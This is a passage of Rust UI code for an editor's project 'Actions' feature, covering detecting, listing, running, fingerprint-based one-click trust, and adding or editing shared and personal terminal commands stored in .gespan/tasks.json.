//! Actions: project commands the footer runs in a dock terminal with one
//! click. They come from every source core detects, plus the personal ones
//! saved here. The button runs the last action run, while it still runs the
//! same command; its chevron lists the rest and opens the editor. New actions
//! are shared through `.gespan/tasks.json` unless the user keeps them personal.
use super::*;
use crate::workspace::{ACTION_ICONS, ProjectAction};
use gespan_core::project_actions::{
    self as project_actions, Action, Listing,
    write::{self, Draft, WriteError},
};
use std::path::Path;

/// The menu row id that expands a collapsed section.
pub(super) const EXPAND: &str = "expand:";
/// `.gespan/tasks.json`'s source, listed under "Project".
const PROJECT: &str = "gespan";
const PERSONAL: &str = "personal";
/// A section with more rows than this starts collapsed.
const COLLAPSE_OVER: usize = 8;
/// Where shared actions are saved, relative to the checkout.
const TASKS_JSON: &str = ".gespan/tasks.json";
/// Shown after an action is added to the shared file.
const ADDED: &str = "Added to .gespan/tasks.json. Commit it to share it.";
/// How long that note stays.
const NOTICE_FOR: std::time::Duration = std::time::Duration::from_secs(8);

/// The action an open dialog edits.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Editing {
    /// A personal action, by its id.
    Personal(String),
    /// A `.gespan/tasks.json` one, by its label.
    Project(String),
}

pub(super) struct ActionDialog {
    /// The action being edited, or `None` for a new one.
    editing: Option<Editing>,
    name: Entity<input::Input>,
    command: Entity<input::Input>,
    icon: &'static str,
    /// A project action's detail, which the dialog doesn't show but keeps.
    detail: Option<String>,
    /// A new action goes to `.gespan/tasks.json`; off keeps it personal.
    share: bool,
    /// The command a project action was filled in with. Saving it unchanged
    /// keeps the task's command as written in the file.
    prefilled: Option<String>,
    /// Why the shared file must be edited by hand, such as its comments; the
    /// dialog then offers to open it instead of saving.
    hand_edit: Option<WriteError>,
    error: Option<SharedString>,
    _events: Vec<Subscription>,
}

/// A project's detected actions and the checkout they were read from.
pub(super) struct ActionListing {
    project: String,
    checkout: String,
    listing: Listing,
    /// Every source file's digest when it was read, so an edit to any of them,
    /// such as a script body, ends one-click trust.
    digest: String,
}

/// Hands `project`'s personal actions to core, so agents list them too.
pub(super) fn publish_personal(project: &str, actions: &[ProjectAction]) {
    project_actions::set_personal(
        project,
        actions.iter().map(ProjectAction::personal).collect(),
    );
}

/// `id` in `actions`. A bare id, saved before actions had sources, is a
/// personal one.
fn find<'a>(actions: &'a [Action], id: &str) -> Option<&'a Action> {
    actions.iter().find(|a| a.id == id).or_else(|| {
        let personal = format!("{PERSONAL}:{id}");
        actions.iter().find(|a| a.id == personal)
    })
}

/// `env` with its shell references filled in from Gespan's own environment.
fn expand_env(env: &[(String, String)]) -> Vec<(String, String)> {
    env.iter()
        .map(|(name, value)| {
            let value =
                project_actions::runs::expand_env(value, cfg!(windows), |n| std::env::var(n).ok());
            (name.clone(), value)
        })
        .collect()
}

/// What `action` runs: its command, cwd and env, and `digest`, the source
/// files'. A repo can change any of them, such as a script's body behind an
/// unchanged `bun run dev`, and a one-click run must run only what the user
/// already ran.
fn fingerprint(action: &Action, digest: &str) -> String {
    let cwd = action.cwd.to_string_lossy();
    serde_json::to_string(&(&action.command, cwd, &action.env, digest)).unwrap_or_default()
}

/// The menu row for `action`: its detail or command beneath, or why it
/// can't run.
fn action_row(action: &Action) -> MenuItem {
    let description = action
        .blocked
        .clone()
        .or_else(|| action.detail.clone())
        .unwrap_or_else(|| action.command.clone());
    MenuAction::new(
        SharedString::from(format!("run:{}", action.id)),
        action.label.clone(),
    )
    .icon(action.icon)
    .description(description)
    .disabled(action.blocked.is_some())
    .into()
}

impl Shell {
    fn personal_actions(&self) -> &[ProjectAction] {
        self.workspace
            .actions
            .get(&self.workspace.project)
            .map_or(&[], Vec::as_slice)
    }
    /// Hands this project's personal actions to core.
    pub(super) fn sync_personal(&self) {
        publish_personal(&self.workspace.project, self.personal_actions());
    }
    /// The project's actions as found in the active session's checkout.
    /// Reads files; core skips the ones that haven't changed.
    pub(super) fn listing(&self, cx: &App) -> Listing {
        let project = &self.workspace.project;
        if project.is_empty() || project.starts_with("remote://") {
            return Listing::default();
        }
        project_actions::detect(project, Path::new(&self.terminal_cwd(cx)))
    }
    /// The actions as found now, with each source file's digest.
    fn detect_actions(&self, cx: &App) -> ActionListing {
        let checkout = self.terminal_cwd(cx);
        let listing = self.listing(cx);
        let digest = project_actions::sources_digest(Path::new(&checkout));
        ActionListing {
            project: self.workspace.project.clone(),
            checkout,
            listing,
            digest,
        }
    }
    /// Detects the actions again, for a menu that is opening.
    pub(super) fn refresh_actions(&mut self, cx: &App) {
        self.action_sections.clear();
        self.action_listing = Some(self.detect_actions(cx));
    }
    /// Detects the actions again only when the project or checkout changed.
    pub(super) fn sync_actions(&mut self, cx: &App) {
        let fresh = self.action_listing.as_ref().is_some_and(|l| {
            l.project == self.workspace.project && l.checkout == self.terminal_cwd(cx)
        });
        if !fresh {
            self.refresh_actions(cx);
        }
    }
    fn actions(&self) -> &[Action] {
        self.action_listing
            .as_ref()
            .filter(|l| l.project == self.workspace.project)
            .map_or(&[], |l| l.listing.actions.as_slice())
    }
    /// `action`'s fingerprint, with the source files as last read. A personal
    /// action lives outside the repository, so no file changes it.
    fn fingerprint(&self, action: &Action) -> String {
        let digest = self
            .action_listing
            .as_ref()
            .filter(|_| action.source != PERSONAL)
            .map_or("", |l| l.digest.as_str());
        fingerprint(action, digest)
    }
    /// The action the footer button runs: the last one run from here, only
    /// while it still runs the same command, cwd and env. Nothing else is
    /// trusted for one click, so a fresh clone's button opens the menu.
    fn footer_action(&self) -> Option<&Action> {
        let project = &self.workspace.project;
        let trusted = self.workspace.last_action_fingerprints.get(project)?;
        let id = self.workspace.last_actions.get(project)?;
        find(self.actions(), id).filter(|a| {
            a.blocked.is_none() && !trusted.is_empty() && self.fingerprint(a) == *trusted
        })
    }
    /// Detects the actions again, keeping the open menu's expanded sections.
    fn redetect(&mut self, cx: &App) {
        self.action_listing = Some(self.detect_actions(cx));
    }
    /// The footer button: runs [`Self::footer_action`] as it is on disk now,
    /// or opens the menu when there is none.
    pub(super) fn run_footer_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.workspace.project.starts_with("remote://") {
            return;
        }
        self.redetect(cx);
        match self.footer_action().cloned() {
            Some(action) => self.launch_action(action, window, cx),
            None => self.toggle_actions_menu(window, cx),
        }
    }
    fn toggle_actions_menu(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.menu_open(&MenuTarget::Actions) {
            self.close_menu(cx);
        } else {
            let anchor = Anchor::Slot(self.actions_anchor.clone());
            self.open_menu(MenuTarget::Actions, anchor, window, cx);
        }
    }
    /// Shows or hides a long section's rows in the open menu.
    pub(super) fn toggle_action_section(&mut self, section: &str) {
        if !self.action_sections.remove(section) {
            self.action_sections.insert(section.to_owned());
        }
    }

    /// Runs `id` in its own dock terminal at the action's `cwd` with its
    /// `env`, reusing that terminal while it sits idle at a prompt in the
    /// same place, and opening a fresh one otherwise.
    pub(super) fn run_action(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        let project = self.workspace.project.clone();
        if project.starts_with("remote://") {
            self.error = Some("Actions are not available on remote projects.".into());
            cx.notify();
            return;
        }
        self.redetect(cx);
        let action = find(self.actions(), id).filter(|a| a.blocked.is_none());
        let Some(action) = action.cloned() else {
            // It went away or can no longer run; the footer shows that.
            cx.notify();
            return;
        };
        self.launch_action(action, window, cx);
    }
    fn launch_action(&mut self, action: Action, window: &mut Window, cx: &mut Context<Self>) {
        let project = self.workspace.project.clone();
        let cwd = action.cwd.to_string_lossy().into_owned();
        let env = expand_env(&action.env);
        let fingerprint = self.fingerprint(&action);
        self.workspace
            .last_actions
            .insert(project.clone(), action.id.clone());
        self.workspace
            .last_action_fingerprints
            .insert(project.clone(), fingerprint);
        self.ensure_terminals(&project, cx);
        let key = (project.clone(), action.id.clone());
        let live = self.terminals.get(&project).cloned().unwrap_or_default();
        let reuse = self
            .action_terminals
            .get(&key)
            .and_then(|weak| weak.upgrade())
            .and_then(|terminal| {
                let ix = live.iter().position(|t| *t == terminal)?;
                let t = terminal.read(cx);
                let idle = t.foreground.is_none() && !t.exited;
                (idle && t.cwd == cwd && t.env == env).then_some((ix, terminal))
            });
        let reveal = self.workspace.preferences.action_opens_terminal;
        // The right panel shows the terminal instead of the dock.
        let in_panel = self.terminal_in_panel(cx);
        let viewport = self.viewport();
        let dock = self.workspace.docks.entry(project.clone()).or_default();
        let was_open = dock.open && !dock.terminals.is_empty();
        let terminal = match reuse {
            Some((ix, terminal)) => {
                if reveal {
                    dock.active = ix;
                    dock.open |= !in_panel;
                }
                terminal
            }
            None => {
                dock.size = dock.side.clamp(dock.size, viewport);
                dock.add(cwd.clone());
                // `add` opens the dock; a background run leaves it as it was.
                dock.open = (reveal && !in_panel) || was_open;
                let terminal = self.spawn_terminal(cwd, &env, cx);
                self.terminals
                    .entry(project.clone())
                    .or_default()
                    .push(terminal.clone());
                self.action_terminals.insert(key, terminal.downgrade());
                terminal
            }
        };
        terminal.update(cx, |t, cx| t.run(&action.command, cx));
        if reveal && in_panel {
            self.show_panel_terminal(window, cx);
        } else if reveal {
            if let Some(dock) = self.workspace.docks.get(&project) {
                self.dock_tab_scroll.scroll_to_item(dock.active);
            }
            if !was_open {
                self.slide_dock(true, cx);
            }
            self.focus_terminal(window, cx);
            self.fit_sidebar(cx);
        }
        self.persist(cx);
        cx.notify();
    }

    /// Every source's actions: "Project", "Personal", then each detected
    /// file, with the files that couldn't be read. Long sections collapse.
    pub(super) fn actions_menu(&self) -> Vec<MenuItem> {
        let (actions, errors) = self
            .action_listing
            .as_ref()
            .filter(|l| l.project == self.workspace.project)
            .map_or((&[][..], &[][..]), |l| {
                (l.listing.actions.as_slice(), l.listing.errors.as_slice())
            });
        let mut sections: Vec<(&str, Vec<MenuItem>)> =
            vec![("Project", Vec::new()), ("Personal", Vec::new())];
        fn rows<'a, 'b>(
            sections: &'b mut Vec<(&'a str, Vec<MenuItem>)>,
            name: &'a str,
        ) -> &'b mut Vec<MenuItem> {
            let at = match sections.iter().position(|(n, _)| *n == name) {
                Some(at) => at,
                None => {
                    sections.push((name, Vec::new()));
                    sections.len() - 1
                }
            };
            &mut sections[at].1
        }
        for action in actions {
            let name = match action.source {
                PROJECT => "Project",
                PERSONAL => "Personal",
                _ => action.file.as_str(),
            };
            rows(&mut sections, name).push(action_row(action));
        }
        let project_files = project_actions::SOURCES
            .iter()
            .find(|source| source.id() == PROJECT)
            .map_or(&[][..], |source| source.files());
        for error in errors {
            let name = if project_files.contains(&error.file.as_str()) {
                "Project"
            } else {
                error.file.as_str()
            };
            let label = format!("Couldn't read {}: {}", error.file, error.reason);
            rows(&mut sections, name).push(
                MenuAction::new(SharedString::from(format!("error:{}", error.file)), label)
                    .icon("alert-circle")
                    .disabled(true)
                    .into(),
            );
        }

        let mut items: Vec<MenuItem> = Vec::new();
        for (name, rows) in sections.into_iter().filter(|(_, rows)| !rows.is_empty()) {
            if !items.is_empty() {
                items.push(MenuItem::Separator);
            }
            if rows.len() > COLLAPSE_OVER && !self.action_sections.contains(name) {
                items.push(
                    MenuAction::new(
                        SharedString::from(format!("{EXPAND}{name}")),
                        format!("{name} ({})", rows.len()),
                    )
                    .icon("chevron-right")
                    .keep_open()
                    .into(),
                );
            } else {
                items.push(MenuItem::Caption(SharedString::from(name.to_owned())));
                items.extend(rows);
            }
        }
        if !items.is_empty() {
            items.push(MenuItem::Separator);
        }
        // The project's shared actions, then personal ones, are edited here;
        // a detected one is copied into the project first.
        let edit: Vec<MenuAction> = actions
            .iter()
            .filter(|a| a.source == PROJECT)
            .map(|a| {
                MenuAction::new(
                    SharedString::from(format!("edit:{}", a.id)),
                    a.label.clone(),
                )
                .icon(a.icon)
            })
            .chain(self.personal_actions().iter().map(|a| {
                MenuAction::new(SharedString::from(format!("edit:{}", a.id)), a.name.clone())
                    .icon(a.icon())
            }))
            .collect();
        if !edit.is_empty() {
            items.push(
                MenuAction::new("edit", "Edit action")
                    .icon("pencil-edit-02")
                    .submenu(edit)
                    .into(),
            );
        }
        let save: Vec<MenuAction> = actions
            .iter()
            .filter(|a| a.source != PROJECT && a.source != PERSONAL && a.blocked.is_none())
            .map(|a| {
                MenuAction::new(
                    SharedString::from(format!("save:{}", a.id)),
                    a.label.clone(),
                )
                .icon(a.icon)
                .description(a.file.clone())
            })
            .collect();
        if !save.is_empty() {
            items.push(
                MenuAction::new("save", "Save to project")
                    .icon("share")
                    .submenu(save)
                    .into(),
            );
        }
        items.push(MenuAction::new("add", "Add action").icon("add-01").into());
        items
    }
    pub(super) fn run_actions_menu(
        &mut self,
        action: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if action == "add" {
            self.open_action_dialog(None, window, cx);
        } else if let Some(id) = action.strip_prefix("run:") {
            self.run_action(id, window, cx);
        } else if let Some(id) = action.strip_prefix("edit:") {
            self.open_action_dialog(Some(id.to_owned()), window, cx);
        } else if let Some(id) = action.strip_prefix("save:") {
            self.save_to_project(id, cx);
        }
    }

    /// Copies the detected action `id` into `.gespan/tasks.json`, where it
    /// takes over from the file it came from. That file is never written.
    fn save_to_project(&mut self, id: &str, cx: &mut Context<Self>) {
        self.redetect(cx);
        let Some(action) = find(self.actions(), id).cloned() else {
            cx.notify();
            return;
        };
        let checkout = self.terminal_cwd(cx);
        match write::save_detected(Path::new(&checkout), &action) {
            Ok(()) => {
                self.show_action_notice(ADDED, cx);
                self.refresh_actions(cx);
            }
            Err(error) => self.error = Some(error.to_string()),
        }
        cx.notify();
    }
    /// A short note, such as where an action was saved, that goes by itself.
    fn show_action_notice(&mut self, text: &'static str, cx: &mut Context<Self>) {
        self.action_notice = Some(text.into());
        // Each note gets its own number, so an older note's timer never
        // clears a newer one, even with the same text.
        self.action_notice_seq += 1;
        let seq = self.action_notice_seq;
        cx.spawn(async move |this, cx| {
            cx.background_executor().timer(NOTICE_FOR).await;
            let _ = this.update(cx, |this, cx| this.expire_action_notice(seq, cx));
        })
        .detach();
    }
    /// Clears the note numbered `seq`, if it is still the one showing.
    fn expire_action_notice(&mut self, seq: u64, cx: &mut Context<Self>) {
        if self.action_notice_seq == seq && self.action_notice.take().is_some() {
            cx.notify();
        }
    }
    /// The note in the notification stack, if one is showing.
    pub(super) fn action_notice_card(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
        let text = self.action_notice.clone()?;
        Some(
            crate::notifications::surface::toast_frame()
                .id("action-notice")
                .debug_selector(|| "action-notice".into())
                .role(Role::Status)
                .child(
                    div()
                        .px(px(14.))
                        .py_3()
                        .flex()
                        .items_center()
                        .gap_2()
                        .child(icon("check", 16.).text_color(content(0.7)))
                        .child(
                            div()
                                .flex_1()
                                .min_w_0()
                                .text_size(px(12.))
                                .line_height(px(19.5))
                                .text_color(content(0.85))
                                .child(text),
                        )
                        .child(
                            icon_button("dismiss-action-notice", "Dismiss", "close").on_click(
                                cx.listener(|this, _, _, cx| {
                                    this.action_notice = None;
                                    cx.notify();
                                }),
                            ),
                        ),
                )
                .into_any_element(),
        )
    }

    /// The footer's split button: run the current action, or pick another.
    pub(super) fn actions_button(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
        if self.workspace.project.starts_with("remote://") {
            return None;
        }
        let classic = self.workspace.boxy_layout();
        let current = self.footer_action().cloned();
        let menu_open = self.menu_open(&MenuTarget::Actions);
        // Each part rounds fully inside the frame's 2px inset.
        let outer = if classic { 6. } else { 10. };
        let segment = |id: &'static str| {
            div()
                .id(id)
                .role(Role::Button)
                .h_full()
                .flex()
                .items_center()
                .rounded(px(outer - 2.))
                .cursor_pointer()
                .text_color(content(0.4))
                // The whole button lights up; the part under the pointer more.
                .group_hover("footer-actions", |s| s.text_color(content(0.8)))
                .hover(|s| s.bg(content(0.08)).text_color(content(1.)))
        };
        let pad = px(if classic { 4. } else { 6. });
        let main = match &current {
            Some(action) => segment("footer-action-run")
                .aria_label(SharedString::from(format!("Run {}", action.label)))
                .aria_description(SharedString::from(action.command.clone()))
                .px(pad)
                .gap(px(6.))
                .max_w(px(180.))
                .min_w_0()
                .child(icon(action.icon, 12.).text_color(content(0.55)))
                .child(div().min_w_0().truncate().child(action.label.clone()))
                .on_click(cx.listener(|this, _, window, cx| this.run_footer_action(window, cx))),
            // Nothing trusted to run: the button opens the menu.
            None => segment("footer-action-open")
                .aria_label("Actions")
                .aria_expanded(menu_open)
                .px(pad)
                .gap(px(6.))
                .child(icon("play", 12.).text_color(content(0.55)))
                .child("Actions")
                .on_click(cx.listener(|this, _, window, cx| this.run_footer_action(window, cx))),
        };
        let chevron = segment("footer-action-menu")
            .aria_label("Actions")
            .aria_expanded(menu_open)
            .relative()
            .px(px(3.))
            .when(menu_open, |d| d.bg(content(0.08)).text_color(content(1.)))
            .child(self.actions_anchor.probe())
            .child(icon("chevron-down", 12.).text_color(content(0.55)))
            .on_click(cx.listener(|this, _, window, cx| this.toggle_actions_menu(window, cx)));
        Some(
            div()
                .id("footer-actions")
                .group("footer-actions")
                .role(Role::Group)
                .aria_label("Actions")
                .h(px(20.))
                .p(px(2.))
                .gap(px(1.))
                .flex()
                .flex_shrink_0()
                .items_stretch()
                .whitespace_nowrap()
                .rounded(px(outer))
                .when(menu_open, |d| d.bg(content(0.06)))
                .hover(|s| s.bg(content(0.06)))
                .child(main)
                .child(chevron)
                .into_any_element(),
        )
    }

    pub(super) fn open_action_dialog(
        &mut self,
        editing: Option<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.close_preview(cx);
        // A shared action that can't run, such as one that asks for input,
        // is fixed in the file itself.
        if let Some(id) = &editing
            && id.starts_with(&format!("{PROJECT}:"))
            && self
                .actions()
                .iter()
                .any(|a| a.id == *id && a.blocked.is_some())
        {
            self.open_tasks_json(window, cx);
            return;
        }
        // What to fill in: an editable action's name, command, icon, detail.
        let existing = match editing {
            Some(id) if id.starts_with(&format!("{PROJECT}:")) => {
                self.actions().iter().find(|a| a.id == id).map(|a| {
                    let label = a.label.clone();
                    let fields = (a.label.clone(), a.command.clone(), a.icon, a.detail.clone());
                    (Editing::Project(label), fields)
                })
            }
            Some(id) => self
                .personal_actions()
                .iter()
                .find(|a| a.id == id)
                .map(|a| {
                    let fields = (a.name.clone(), a.command.clone(), a.icon(), None);
                    (Editing::Personal(a.id.clone()), fields)
                }),
            None => None,
        };
        let name = cx.new(|cx| input::Input::field("Action name", "Test", content(0.3), cx));
        let command = cx.new(input::Input::action_command);
        if let Some((_, (label, line, _, _))) = &existing {
            name.update(cx, |i, cx| i.set_text(label.clone(), cx));
            command.update(cx, |i, cx| i.set_text(line.clone(), cx));
        }
        let clear = |this: &mut Self, cx: &mut Context<Self>| {
            if let Some(dialog) = &mut this.action_dialog
                && dialog.error.take().is_some()
            {
                cx.notify();
            }
        };
        let events = vec![
            cx.subscribe_in(
                &name,
                window,
                |this, _, _: &input::Submitted, window, cx| this.save_action(window, cx),
            ),
            cx.subscribe_in(
                &command,
                window,
                |this, _, _: &input::Submitted, window, cx| this.save_action(window, cx),
            ),
            cx.subscribe(&name, move |this, _, _: &input::Changed, cx| {
                clear(this, cx)
            }),
            cx.subscribe(&command, move |this, _, _: &input::Changed, cx| {
                // A command that can't be one line may be put back as it
                // was, which saves as a rename; a commented file stays so.
                if let Some(dialog) = &mut this.action_dialog
                    && dialog.hand_edit == Some(WriteError::NeedsHandEdit)
                {
                    dialog.hand_edit = None;
                    cx.notify();
                }
                clear(this, cx)
            }),
        ];
        window.focus(&name.read(cx).focus_handle(cx), cx);
        let (editing, (prefilled, icon, detail)) = match existing {
            Some((editing, (_, line, icon, detail))) => {
                let prefilled = matches!(editing, Editing::Project(_)).then_some(line);
                (Some(editing), (prefilled, icon, detail))
            }
            None => (None, (None, ACTION_ICONS[0], None)),
        };
        self.action_dialog = Some(ActionDialog {
            icon,
            detail,
            editing,
            name,
            command,
            share: true,
            prefilled,
            hand_edit: None,
            error: None,
            _events: events,
        });
        cx.notify();
    }
    /// Flips a new action between shared and personal.
    pub(super) fn toggle_action_share(&mut self, cx: &mut Context<Self>) {
        if let Some(dialog) = &mut self.action_dialog {
            dialog.share = !dialog.share;
            dialog.hand_edit = None;
            dialog.error = None;
            cx.notify();
        }
    }
    /// Opens `.gespan/tasks.json` in the file editor, as the explorer opens a
    /// file, for what Gespan won't rewrite itself.
    pub(super) fn open_tasks_json(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let path = Path::new(&self.terminal_cwd(cx)).join(TASKS_JSON);
        self.close_action_dialog(window, cx);
        let cwd = self.git.read(cx).project().to_owned();
        let path = path.to_string_lossy().into_owned();
        self.open_review(crate::review::ReviewTab::File { cwd, path }, window, cx);
    }
    /// Shows why a shared write failed, offering to open the file when only
    /// a hand edit will do.
    fn write_failed(&mut self, error: WriteError, cx: &mut Context<Self>) {
        if let Some(dialog) = &mut self.action_dialog {
            dialog.error = Some(error.to_string().into());
            let by_hand = matches!(error, WriteError::HasComments | WriteError::NeedsHandEdit);
            dialog.hand_edit = by_hand.then_some(error);
            cx.notify();
        }
    }
    pub(super) fn close_action_dialog(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.action_dialog.take().is_some() {
            self.focus_active(window, cx);
            cx.notify();
        }
    }
    fn save_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(dialog) = &mut self.action_dialog else {
            return;
        };
        let name = dialog.name.read(cx).content.trim().to_owned();
        let command = dialog.command.read(cx).content.trim().to_owned();
        if name.is_empty() || command.is_empty() {
            dialog.error = Some("Give the action a name and a command.".into());
            cx.notify();
            return;
        }
        let shared = match &dialog.editing {
            None if dialog.share => Some(None),
            Some(Editing::Project(label)) => Some(Some(label.clone())),
            _ => None,
        };
        if let Some(label) = shared {
            // Asked again on each try: the file may have been fixed since.
            dialog.hand_edit = None;
            let unchanged = dialog.prefilled.as_deref().map(str::trim) == Some(command.as_str());
            let draft = Draft {
                label: name,
                command,
                icon: dialog.icon.to_owned(),
                detail: dialog.detail.clone(),
            };
            let checkout = self.terminal_cwd(cx);
            let checkout = Path::new(&checkout);
            let written = match &label {
                None => write::add(checkout, &draft),
                // Only the name, icon or detail changed: the command stays
                // exactly as the file has it.
                Some(label) if unchanged => write::relabel(checkout, label, &draft),
                Some(label) => write::update(checkout, label, &draft),
            };
            match written {
                Ok(()) => {
                    if label.is_none() {
                        self.show_action_notice(ADDED, cx);
                    }
                    self.refresh_actions(cx);
                    self.close_action_dialog(window, cx);
                }
                Err(error) => self.write_failed(error, cx),
            }
            return;
        }
        let id = match &dialog.editing {
            Some(Editing::Personal(id)) => id.clone(),
            _ => format!("{:x}", gespan_core::time::now_ms()),
        };
        let action = ProjectAction {
            id,
            name,
            command,
            icon: dialog.icon.to_owned(),
        };
        let project = self.workspace.project.clone();
        let actions = self.workspace.actions.entry(project.clone()).or_default();
        match actions.iter_mut().find(|a| a.id == action.id) {
            Some(slot) => *slot = action.clone(),
            None => actions.push(action.clone()),
        }
        self.workspace
            .last_actions
            .insert(project, format!("{PERSONAL}:{}", action.id));
        self.sync_personal();
        self.refresh_actions(cx);
        self.persist(cx);
        self.close_action_dialog(window, cx);
    }
    fn delete_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(editing) = self.action_dialog.as_ref().and_then(|d| d.editing.clone()) else {
            return;
        };
        let project = self.workspace.project.clone();
        let id = match editing {
            Editing::Project(label) => {
                let checkout = self.terminal_cwd(cx);
                match write::remove(Path::new(&checkout), &label) {
                    Ok(()) => {
                        self.refresh_actions(cx);
                        self.close_action_dialog(window, cx);
                    }
                    Err(error) => self.write_failed(error, cx),
                }
                return;
            }
            Editing::Personal(id) => id,
        };
        if let Some(actions) = self.workspace.actions.get_mut(&project) {
            actions.retain(|a| a.id != id);
            if actions.is_empty() {
                self.workspace.actions.remove(&project);
            }
        }
        let full = format!("{PERSONAL}:{id}");
        if self
            .workspace
            .last_actions
            .get(&project)
            .is_some_and(|last| *last == id || *last == full)
        {
            self.workspace.last_actions.remove(&project);
            self.workspace.last_action_fingerprints.remove(&project);
        }
        self.action_terminals.remove(&(project, full));
        self.sync_personal();
        self.refresh_actions(cx);
        self.persist(cx);
        self.close_action_dialog(window, cx);
    }

    /// The Add/Edit action dialog, centred over the window.
    pub(super) fn action_modal(
        &self,
        window: &Window,
        cx: &mut Context<Self>,
    ) -> Option<AnyElement> {
        let dialog = self.action_dialog.as_ref()?;
        let editing = dialog.editing.is_some();
        let viewport = window.viewport_size();
        let width = 420f32.min(viewport.width.as_f32() - 24.);
        let anchor = Anchor::Center;
        let weak = cx.weak_entity();
        let label = |text: &'static str| {
            div()
                .font_weight(FontWeight::MEDIUM)
                .text_color(content(0.8))
                .child(text)
        };
        let field = |input: Entity<input::Input>, multiline: bool| {
            div()
                .when(!multiline, |d| d.h(px(36.)).flex().items_center())
                .when(multiline, |d| d.py(px(8.)))
                .px(px(10.))
                .rounded_md()
                .border_1()
                .border_color(content(0.1))
                .bg(content(0.05))
                .text_size(px(13.))
                .text_color(content(1.))
                .child(input)
        };
        let icons = div()
            .flex()
            .gap(px(6.))
            .children(ACTION_ICONS.iter().enumerate().map(|(ix, name)| {
                let selected = *name == dialog.icon;
                div()
                    .id(("action-icon", ix))
                    .role(Role::RadioButton)
                    .aria_label(SharedString::from(*name))
                    .aria_toggled(if selected {
                        gpui::Toggled::True
                    } else {
                        gpui::Toggled::False
                    })
                    .size(px(34.))
                    .flex()
                    .items_center()
                    .justify_center()
                    .rounded_md()
                    .border_1()
                    .cursor_pointer()
                    .map(|d| {
                        if selected {
                            d.border_color(accent_color()).bg(content(0.08))
                        } else {
                            d.border_color(content(0.1)).hover(|s| s.bg(content(0.06)))
                        }
                    })
                    .child(icon(name, 16.).text_color(if selected {
                        content(1.)
                    } else {
                        content(0.6)
                    }))
                    .on_click(cx.listener(move |this, _, _, cx| {
                        if let Some(dialog) = &mut this.action_dialog {
                            dialog.icon = name;
                            cx.notify();
                        }
                    }))
            }));
        let title = if editing { "Edit action" } else { "Add action" };
        // Why the file needs a hand edit stays while typing.
        let error = dialog
            .error
            .clone()
            .or_else(|| dialog.hand_edit.as_ref().map(|e| e.to_string().into()));
        let share = dialog.share;
        let share_toggle =
            div()
                .id("action-share")
                .debug_selector(|| "action-share".into())
                .role(Role::Switch)
                .aria_label("Share with the project")
                .aria_toggled(if share {
                    gpui::Toggled::True
                } else {
                    gpui::Toggled::False
                })
                .flex()
                .items_center()
                .gap_2()
                .cursor_pointer()
                .child(
                    div()
                        .w(px(30.))
                        .h(px(18.))
                        .flex_shrink_0()
                        .rounded_full()
                        .bg(if share { accent_color() } else { content(0.18) })
                        .relative()
                        .child(
                            div()
                                .absolute()
                                .top(px(3.))
                                .left(px(if share { 15. } else { 3. }))
                                .size(px(12.))
                                .rounded_full()
                                .bg(content(1.)),
                        ),
                )
                .child(
                    div()
                        .flex()
                        .flex_col()
                        .child(label("Share with the project"))
                        .child(div().text_size(px(11.)).text_color(content(0.45)).child(
                            if share {
                                "Saved in .gespan/tasks.json for everyone."
                            } else {
                                "Only you see it, in Gespan."
                            },
                        )),
                )
                .on_click(cx.listener(|this, _, _, cx| this.toggle_action_share(cx)));
        let primary = if dialog.hand_edit.is_some() {
            crate::modal::primary_button("action-open-tasks", "Open tasks.json")
                .debug_selector(|| "action-open-tasks".into())
                .w_full()
                .cursor_pointer()
                .on_click(cx.listener(|this, _, window, cx| this.open_tasks_json(window, cx)))
        } else {
            crate::modal::primary_button("action-save", if editing { "Save" } else { "Add action" })
                .debug_selector(|| "action-save".into())
                .w_full()
                .cursor_pointer()
                .on_click(cx.listener(|this, _, window, cx| this.save_action(window, cx)))
        };
        Some(
            div()
                .absolute()
                .size_full()
                .child(crate::modal::scrim("action-scrim"))
                .child(
                    popover("action-modal", anchor)
                        .modal_surface(self.workspace.boxy_layout())
                        .width(width)
                        .gap(0.)
                        .priority(60)
                        .on_dismiss(move |window, cx| {
                            let _ =
                                weak.update(cx, |this, cx| this.close_action_dialog(window, cx));
                        })
                        .child(
                            div()
                                .id("action-dialog")
                                .role(Role::Dialog)
                                .aria_label(title)
                                .p_4()
                                .flex()
                                .flex_col()
                                .gap_4()
                                .text_size(px(12.))
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(
                                            div()
                                                .text_size(px(14.))
                                                .font_weight(FontWeight::SEMIBOLD)
                                                .text_color(content(1.))
                                                .child(title),
                                        )
                                        .when(!editing, |d| {
                                            d.child(
                                                div()
                                                    .line_height(px(18.))
                                                    .text_color(content(0.6))
                                                    .child("Save a project command to run with one click."),
                                            )
                                        }),
                                )
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(label("Icon"))
                                        .child(icons),
                                )
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(label("Name"))
                                        .child(field(dialog.name.clone(), false)),
                                )
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(label("Command"))
                                        .child(field(dialog.command.clone(), true))
                                        .child(match error {
                                            Some(error) => div()
                                                .id("action-error")
                                                .role(Role::Alert)
                                                .text_size(px(11.))
                                                .text_color(rgb(0xf87171))
                                                .child(error),
                                            None => div()
                                                .id("action-help")
                                                .text_size(px(11.))
                                                .text_color(content(0.45))
                                                .child("Runs in a terminal at the project root."),
                                        }),
                                )
                                .when(!editing, |d| d.child(share_toggle))
                                // Full-width buttons, the confirming one first.
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_2()
                                        .child(primary)
                                        .when(editing, |d| {
                                            d.child(
                                                crate::modal::danger_ghost_button(
                                                    "action-delete",
                                                    "Delete action",
                                                )
                                                .debug_selector(|| "action-delete".into())
                                                .w_full()
